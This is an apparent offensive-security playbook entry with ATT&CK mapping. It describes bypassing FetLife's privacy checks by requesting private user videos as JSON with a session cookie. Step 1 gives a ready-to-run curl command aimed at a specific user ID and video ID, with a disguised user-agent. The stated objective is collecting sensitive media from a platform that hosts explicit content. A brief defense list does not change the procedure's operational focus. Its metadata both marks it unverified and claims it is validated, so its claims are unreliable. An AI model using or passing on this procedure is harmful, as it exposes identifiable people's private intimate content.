---
id: eaf56324-a325-4505-95b4-815e0fa3504d
name: Access-Private-FetLife-Videos-via-JSON
type: procedure
verified: false
submitted: true
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:30:34.914Z'
tactics:
  - '[[Collection]]'
techniques:
  - '[[Data from Information Repositories]]'
tags:
  - authorization-bypass
  - json-api
  - information-disclosure
  - fetlife
  - videos
commands:
  - '[[commands/curl-fetlife-private-video-json]]'
platforms:
  - Web
tools:
  - '[[tools/curl]]'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Collection]]'
mitre_techniques:
  - '[[Data from Information Repositories]]'
---

# Access-Private-FetLife-Videos-via-JSON

## Summary

This procedure bypasses authorization in FetLife's video endpoints using JSON requests to unauthorizedly access private user videos, disclosing sensitive video metadata and links via known resource IDs.

## Description

The /users/{user-id}/videos/{video-id} endpoint in FetLife neglects privacy checks for JSON responses. With a session cookie, attackers can retrieve private videos' details, including embed codes and descriptions, violating user privacy on a platform handling explicit content.

## Requirements

1. Valid _fl_sessionid cookie from FetLife login
2. Specific user ID and private video ID
3. HTTP client like curl
4. Internet connectivity to FetLife

## Defense

Defensive measures and detection strategies:

- Apply access controls uniformly to JSON and HTML handlers
- Log and alert on JSON requests to media endpoints from unauthorized sessions
- Encrypt or restrict direct links to private media

## Objectives

1. Fetch private video JSON without owner authentication
2. Collect sensitive multimedia data
3. Highlight API security gaps

## Instructions

### Step 1: Issue JSON Request for Private Video

**Context**: Use curl to target the video endpoint with bypass headers.

**Command** ([[commands/curl-fetlife-private-video-json]]):
```bash
curl https://fetlife.com/users/14104003/videos/3102890 -H "Cookie: _fl_sessionid={your-session}" -H "Accept: application/json" --user-agent "not cur1"
```

> Substitute {your-session} with your cookie. Expected: JSON payload with video info, confirming unauthorized access.

### Step 2: Analyze Response for Disclosure

**Context**: Verify private fields in JSON.

Examine output for video URLs and privacy indicators showing exposure.

## MITRE ATT&CK Mapping

### Tactics

- [[Collection]]

### Techniques

- [[Data from Information Repositories]]

### Sub-Techniques


## Commands Used

- [[commands/curl-fetlife-private-video-json]]

## Tools Used

- [[tools/curl]]

## Tags

- [[authorization-bypass]]
- [[information-disclosure]]
- [[videos]]
